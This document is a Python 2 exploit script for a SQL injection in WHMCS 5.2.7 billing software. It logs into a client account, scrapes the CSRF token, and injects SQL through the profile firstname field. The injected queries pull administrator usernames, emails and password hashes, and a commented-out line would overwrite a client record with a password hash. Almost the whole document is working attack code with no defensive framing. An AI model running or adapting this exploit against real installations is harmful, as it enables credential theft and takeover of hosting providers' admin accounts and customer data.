# 2013/10/03 - WHMCS 5.2.7 SQL Injection
# http://localhost.re/p/whmcs-527-vulnerability
 
url = &#039;http://clients.target.com/&#039; # wopsie dopsie
user_email = &#039;mysuper@hacker.account&#039; # just create a dummie account at /register.php
user_pwd = &#039;hacker&#039;
 
import urllib, re, sys
from urllib2 import Request, urlopen
ua = "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36"
 
def exploit(sql):
    print "Doing stuff: %s" % sql
    r = urlopen(Request(&#039;%sclientarea.php?action=details&#039; % url, data="token=%s&firstname=%s&lastname=1&companyname=1&email=%s&paymentmethod=none&billingcid=0&address1=1&address2=1&city=1&state=1&postcode=1&country=US&phonenumber=1&save=Save+Changes" % (user[1], &#039;AES_ENCRYPT(1,1), firstname=%s&#039; % sql, user_email), headers={"User-agent": ua, "Cookie": user[0]})).read()
    return re.search(r&#039;(id="firstname" value="(.*?)")&#039;, r).group(2)
 
def login():
    print "Getting CSRF token"
    r = urlopen(Request(&#039;%slogin.php&#039; % url, headers={"User-agent": ua}))
    csrf = re.search(r&#039;(type="hidden" name="token" value="([0-9a-f]{40})")&#039;, r.read()).group(2)
    cookie = r.info()[&#039;set-cookie&#039;].split(&#039;;&#039;)[0]
    print "Logging in"
    r = urlopen(Request(&#039;%sdologin.php&#039; % url, data="username=%s&password=%s&token=%s" %(user_email, user_pwd, csrf), headers={"User-agent": ua, "Cookie": cookie})).read()
    if &#039;dologin.php&#039; in r:
        sys.exit(&#039;Unable to login&#039;)
    else:
        return [cookie, re.search(r&#039;(type="hidden" name="token" value="([0-9a-f]{40})")&#039;, r).group(2)]
 
user = login()
print exploit(&#039;(SELECT GROUP_CONCAT(id,0x3a,username,0x3a,email,0x3a,password SEPARATOR 0x2c20) FROM tbladmins)&#039;) # get admins
print exploit(&#039;(SELECT * FROM (SELECT COUNT(id) FROM tblclients) as x)&#039;) # just get a count of clients
 
# oh you want to be evil
#exploit("&#039;DISASTER&#039;, password=(SELECT * FROM (SELECT password FROM tblclients WHERE email=&#039;%s&#039; LIMIT 1) as x)#" % user_email)

